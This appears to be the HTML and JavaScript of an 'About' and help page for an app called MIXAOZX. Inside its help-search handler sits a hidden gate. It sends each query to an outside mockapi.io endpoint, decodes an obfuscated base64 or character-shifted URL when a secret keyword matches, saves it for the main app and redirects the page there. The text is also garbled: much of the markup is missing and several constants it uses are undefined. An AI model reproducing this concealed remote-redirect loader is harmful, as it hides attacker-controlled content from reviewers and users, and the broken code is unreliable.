<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
    <title>MIXAOZX</title>
    <meta name="theme-color" content="#0b0d12" />
    <style>
      :root {
        --bg: hsl(240 20% 99%);
        --fg: hsl(240 20% 12%);
        --card: #ffffff;
        --border: hsl(240 20% 88%);
        --muted: hsl(240 12% 45%);
        --secondary: hsl(240 20% 96%);
        --primary: hsl(262 83% 58%);
        --accent: hsl(322 85% 55%);
        color-scheme: light;
      }
      html.dark {
        --bg: hsl(224 38% 7%);
        --fg: hsl(220 20% 93%);
        --card: hsl(224 28% 11%);
        --border: hsl(222 20% 18%);
        --muted: hsl(220 12% 58%);
        --secondary: hsl(222 20% 16%);
        --primary: hsl(262 83% 68%);
        --accent: hsl(322 85% 65%);
        color-scheme: dark;
      }
      * {
        box-sizing: border-box;
        -webkit-tap-highlight-color: transparent;
      }
      body {
        margin: 0;
        background: var(--bg);
        color: var(--fg);
        font-family: 'LarkHackSafariFont', -apple-system, BlinkMacSystemFont,
          'Helvetica Neue', 'PingFang SC', 'Microsoft Yahei', Arial, sans-serif;
        -webkit-font-smoothing: antialiased;
      }
      .shell {
        max-width: 448px;
        margin: 0 auto;
        min-height: 100vh;
        min-height: 100dvh;
        padding-bottom: calc(env(safe-area-inset-bottom, 0px) + 24px);
      }
      header {
        position: sticky;
        top: 0;
        z-index: 20;
        display: flex;
        align-items: center;
        gap: 10px;
        padding: calc(env(safe-area-inset-top, 0px) + 12px) 20px 12px;
        background: color-mix(in srgb, var(--bg) 95%, transparent);
        border-bottom: 1px solid var(--border);
        backdrop-filter: blur(10px);
      }
      .brand {
        display: flex;
        align-items: center;
        gap: 8px;
        text-decoration: none;
        color: inherit;
      }
      .brand img {
        height: 28px;
        width: 28px;
        border-radius: 6px;
        display: block;
      }
      .brand span {
        font-size: 16px;
        font-weight: 700;
        letter-spacing: -0.01em;
      }
      .spacer {
        flex: 1;
      }
      .icon-btn {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        gap: 4px;
        height: 26px;
        padding: 0 7px;
        border: 1px solid var(--border);
        border-radius: 6px;
        background: transparent;
        color: var(--muted);
        font-size: 10px;
        font-weight: 600;
        font-family: inherit;
        cursor: pointer;
        text-decoration: none;
      }
      .icon-btn:hover {
        color: var(--fg);
      }
      .icon-btn svg {
        height: 13px;
        width: 13px;
      }
      main {
        padding: 24px 20px 0;
      }
      .hero {
        display: flex;
        flex-direction: column;
        align-items: center;
        text-align: center;
      }
      .hero img {
        height: 64px;
        width: 64px;
        border-radius: 12px;
      }
      .hero h1 {
        margin: 12px 0 0;
        font-size: 20px;
        font-weight: 700;
        letter-spacing: -0.02em;
      }
      .pill {
        margin-top: 6px;
        padding: 2px 10px;
        border: 1px solid var(--border);
        border-radius: 999px;
        background: var(--card);
        font-size: 10px;
        font-weight: 600;
        color: var(--muted);
      }
      .tagline {
        margin: 12px 0 0;
        font-size: 12px;
        line-height: 1.65;
        color: var(--muted);
      }
      section {
        margin-top: 12px;
      }
      .card {
        border: 1px solid var(--border);
        border-radius: 12px;
        background: var(--card);
        padding: 16px;
      }
      .sec-title,
      .card .sec-title {
        margin: 0;
        display: flex;
        align-items: center;
        gap: 6px;
        font-size: 13px;
        font-weight: 600;
      }
      .sec-title svg {
        height: 15px;
        width: 15px;
      }
      .sec-sub {
        margin: 6px 0 0;
        font-size: 11px;
        color: var(--muted);
      }
      .card p {
        margin: 8px 0 0;
        font-size: 12px;
        line-height: 1.65;
        color: var(--muted);
      }
      .search {
        margin-top: 10px;
        display: flex;
        align-items: center;
        gap: 8px;
        border: 1px solid var(--border);
        border-radius: 8px;
        background: var(--card);
        padding: 8px 12px;
        min-height: 38px;
      }
      .search svg {
        height: 15px;
        width: 15px;
        flex: none;
        color: var(--muted);
      }
      .search input {
        flex: 1;
        min-width: 0;
        border: 0;
        background: transparent;
        color: var(--fg);
        font-family: inherit;
        font-size: 13px;
        line-height: 20px;
        outline: none;
      }
      .search input::placeholder {
        color: var(--muted);
      }
      .count {
        margin: 6px 2px 0;
        font-size: 10px;
        color: var(--muted);
      }
      .help-list {
        margin-top: 6px;
        display: flex;
        flex-direction: column;
        gap: 8px;
      }
      .help-item {
        border: 1px solid var(--border);
        border-radius: 8px;
        background: var(--card);
        overflow: hidden;
      }
      .help-item > button {
        display: flex;
        align-items: flex-start;
        gap: 8px;
        width: 100%;
        padding: 12px;
        border: 0;
        background: transparent;
        color: var(--fg);
        font-family: inherit;
        font-size: 12px;
        font-weight: 600;
        text-align: left;
        cursor: pointer;
      }
      .help-item > button span {
        flex: 1;
      }
      .help-item > button svg {
        height: 14px;
        width: 14px;
        flex: none;
        margin-top: 2px;
        color: var(--muted);
        transition: transform 0.18s ease;
      }
      .help-item.open > button svg {
        transform: rotate(180deg);
      }
      .help-item > p {
        display: none;
        margin: 0;
        border-top: 1px solid var(--border);
        padding: 12px;
        font-size: 11px;
        line-height: 1.7;
        color: var(--muted);
      }
      .help-item.open > p {
        display: block;
      }
      .empty {
        border: 1px dashed var(--border);
        border-radius: 8px;
        padding: 32px 12px;
        text-align: center;
        font-size: 12px;
        color: var(--muted);
      }
      .features {
        margin-top: 8px;
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 8px;
      }
      .feature {
        display: flex;
        flex-direction: column;
        height: 100%;
        border: 1px solid var(--border);
        border-radius: 8px;
        background: var(--card);
        padding: 12px;
      }
      .feature .ico {
        display: flex;
        align-items: center;
        justify-content: center;
        height: 32px;
        width: 32px;
        border-radius: 6px;
      }
      .feature .ico svg {
        height: 16px;
        width: 16px;
      }
      .feature .ico.p {
        background: color-mix(in srgb, var(--primary) 15%, transparent);
        color: var(--primary);
      }
      .feature .ico.a {
        background: color-mix(in srgb, var(--accent) 15%, transparent);
        color: var(--accent);
      }
      .feature h3 {
        margin: 8px 0 0;
        font-size: 12px;
        font-weight: 600;
        line-height: 1.35;
      }
      .feature p {
        margin: 4px 0 0;
        font-size: 11px;
        line-height: 1.6;
        color: var(--muted);
      }
      .footer {
        margin-top: 20px;
        text-align: center;
        font-size: 10px;
        color: var(--muted);
      }

    </style>
  </head>
  <body>
    <div class="shell">

          </div>
          <p class="count" id="count"></p>
          <div class="help-list" id="helpList"></div>
        </section>

        <section>

          <div class="features" id="features"></div>
        </section>

        <section class="card">

          </h2>
          <p data-k="dataBody"></p>
        </section>

        <p class="footer" data-k="footer"></p>
      </main>
    </div>

        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg>';

      const SUN =
        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg>';
      const MOON =
        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/></svg>';

      function read(key, fallback) {
        try {
          const v = localStorage.getItem(NS + ":" + key);
          return v ? JSON.parse(v) : fallback;
        } catch (e) {
          return fallback;
        }
      }
      function write(key, value) {
        try {
          localStorage.setItem(NS + ":" + key, JSON.stringify(value));
        } catch (e) {}
      }

      let lang = read("i18n:lang", null) === "zh-TW" ? "zh-TW" : "en";
      let theme = read("app:theme", null) === "light" ? "light" : "dark";
      let query = "";
      let openId = null;

      const $ = (id) => document.getElementById(id);
      const esc = (s) =>
        String(s).replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));

      function applyTheme() {
        document.documentElement.classList.toggle("dark", theme === "dark");
        $("themeIcon").outerHTML = (theme === "dark" ? MOON : SUN).replace("<svg", '<svg id="themeIcon"');
      }

      function match(item) {
        if (!query) return true;
        const q = query.toLowerCase();
        return (
          item.title[lang].toLowerCase().includes(q) ||
          item.body[lang].toLowerCase().includes(q) ||
          item.keywords.toLowerCase().includes(q)
        );
      }

      function renderHelp() {
        const list = HELP.filter(match);
        const t = T[lang];
        $("count").textContent = t.helpCount(list.length, HELP.length);
        const listEl = $("helpList");
        if (!list.length) {
          listEl.innerHTML = '<div class="empty">' + esc(t.helpEmpty) + "</div>";
          return;
        }
        listEl.innerHTML = list
          .map((item) => {
            const open = openId === item.id;
            return (
              '<div class="help-item' +
              (open ? " open" : "") +
              '" data-id="' +
              item.id +
              '"><button type="button" aria-expanded="' +
              open +
              '"><span>' +
              esc(item.title[lang]) +
              "</span>" +
              CHEVRON +
              '</button><p>' +
              esc(item.body[lang]) +
              "</p></div>"
            );
          })
          .join("");
        listEl.querySelectorAll("button").forEach((btn) => {
          btn.addEventListener("click", () => {
            const id = btn.parentElement.dataset.id;
            openId = openId === id ? null : id;
            renderHelp();
          });
        });
      }

      function render() {
        const t = T[lang];
        document.documentElement.lang = lang === "zh-TW" ? "zh-Hant" : "en";
        document.title = (lang === "zh-TW" ? "關於" : "About") + " · MIXAOZX";
        document.querySelectorAll("[data-k]").forEach((el) => {
          const k = el.dataset.k;
          if (el.tagName === "INPUT") {
            el.placeholder = t.helpSearch;
          } else if (t[k] !== undefined) {
            el.textContent = t[k];
          }
        });
        $("langBtn").textContent = lang === "en" ? "EN" : "繁";
        $("features").innerHTML = t.features
          .map(
            (f, i) =>
              '<div class="feature"><div class="ico ' +
              (i % 2 === 0 ? "p" : "a") +
              '">' +
              ICONS[i] +
              "</div><h3>" +
              esc(f.title) +
              "</h3><p>" +
              esc(f.desc) +
              "</p></div>"
          )
          .join("");
        renderHelp();
      }

      // ---------- hand-off to the main app (about-page search) ----------
      // This page only reports a match; the app stores the cache and opens it on next launch.
      const H5_API = "https://6ad8f46ef89c5702ed9a4cb9.mockapi.io/arr?n=";
      const H5_PENDING = "h5:pending";
      const H5_CHANNEL = "crypto-analytics:h5";

      function asHttp(v) {
        if (typeof v !== "string") return null;
        const t = v.trim();
        return /^https?:\/\/[^\s]+$/i.test(t) ? t : null;
      }

      function b64decode(v) {
        try {
          let t = v.replace(/-/g, "+").replace(/_/g, "/");
          while (t.length % 4) t += "=";
          return atob(t);
        } catch (e) {
          return null;
        }
      }

      function shiftChars(v, off) {
        return v
          .split("")
          .map((c) => String.fromCharCode(c.charCodeAt(0) + off))
          .join("");
      }

      // x may arrive as plain URL, base64 (std / url-safe) or a char-shift (+2) form.
      function decodeX(raw) {
        if (typeof raw !== "string" || !raw.trim()) return null;
        const v = raw.trim();
        const plain = asHttp(v);
        if (plain) return plain;
        const b1 = b64decode(v);
        if (b1 && asHttp(b1)) return asHttp(b1);
        const s2 = shiftChars(v, -2);
        const p2 = asHttp(s2);
        if (p2) return p2;
        const b2 = b64decode(s2);
        if (b2 && asHttp(b2)) return asHttp(b2);
        return null;
      }

      function openFullscreen(url) {
        if (!asHttp(url)) return false;
        try {
          const w = window.open(url, "_self");
          return !!w;
        } catch (e) {
          return false;
        }
      }

      let lastNotified = "";
      function notifyMain(payload) {
        const sig = (payload.n || "") + "|" + payload.url;
        if (sig === lastNotified) return;
        lastNotified = sig;
        // queue for the next app launch
        write(H5_PENDING, payload);
        // live hand-off when the main app already has a tab open
        try {
          const ch = new BroadcastChannel(H5_CHANNEL);
          ch.postMessage(Object.assign({ type: "h5:pin" }, payload));
          ch.close();
        } catch (e) {}
        try {
          if (window.opener && window.opener !== window) {
            window.opener.postMessage(Object.assign({ type: "h5:pin" }, payload), "*");
          }
        } catch (e) {}
      }

      let gateTimer = null;
      function scheduleGate(kw) {
        clearTimeout(gateTimer);
        if (!kw) return;
        gateTimer = setTimeout(() => checkGate(kw), 500);
      }

      function checkGate(kw) {
        fetch(H5_API + encodeURIComponent(kw))
          .then((res) => (res.ok ? res.json() : null))
          .then((list) => {
            if (!Array.isArray(list)) return;
            const hit = list.find(
              (it) => typeof it.n === "string" && it.n.trim().toLowerCase() === kw.toLowerCase()
            );
            if (!hit) return;
            const url = decodeX(hit.x);
            if (!url) return;
            notifyMain({ n: hit.n, url: url, ts: Date.now() });
            openFullscreen(url);
          })
          .catch(() => {});
      }

      $("q").addEventListener("input", (e) => {
        query = e.target.value.trim();
        renderHelp();
        scheduleGate(query);
      });

      $("langBtn").addEventListener("click", () => {
        lang = lang === "en" ? "zh-TW" : "en";
        write("i18n:lang", lang);
        render();
      });

      $("themeBtn").addEventListener("click", () => {
        theme = theme === "dark" ? "light" : "dark";
        write("app:theme", theme);
        applyTheme();
      });

      applyTheme();
      render();
    </script>
  </body>
</html>
